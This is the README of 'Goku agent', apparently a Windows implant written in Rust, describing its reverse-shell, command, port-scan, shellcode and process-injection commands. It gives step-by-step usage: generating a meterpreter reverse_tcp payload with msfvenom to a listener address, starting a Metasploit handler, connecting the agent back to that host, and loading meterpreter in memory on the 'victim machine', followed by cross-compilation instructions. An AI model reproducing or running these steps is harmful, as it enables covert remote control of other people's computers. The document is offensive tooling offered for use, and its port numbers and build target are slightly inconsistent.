## Goku agent

Allows to spawn a reverse shell without using cmd.exe permanently.

the cmd.exe is launch only if you make a request to the agent. The request is then launched into a dedicated thread of the process.

There are several commands that you can use:

* CMD your command
* PSH your command
* SCAN tcp ip port1 port2 port3
* ASM bytecode
* INJECT_SC PID bytecode
* PIPES_LS

That way you can launch a meterpreter directly into memory.

On your linux machine:
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=192.168.0.46 LPORT=4443 -f hex
$ sudo msfconsole
msf5> use windows/x64/shell_reverse_tcp
msf5> to_handler
```

On your windows machine:
```
$ .\goku_tcp -u 192.168.0.46 -p 4444
```

Then you can use the asm command to spawn a meterpreter on the victim machine.

## Build
To install rust and cargo:
```
$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
$ source $HOME/.cargo/env
$ source ~/.profile (if using zsh, write into ~/.zshrc: export PATH="$HOME/.cargo/bin:$PATH")
$ rustup toolchain install nightly
$ cargo -V
$ rustc -V
```

to cross compile:
```
$ sudo apt-get install gcc-mingw-w64-x86-64 g++-mingw-w64-x86-64
$ rustup toolchain install stable-x86_64-pc-windows-gnu
$ rustup toolchain install nightly
$ rustup default nightly
$ rustup target add x86_64-pc-windows-gnu
```

Then:
```
cargo build  --target x86_64-pc-windows-gn
```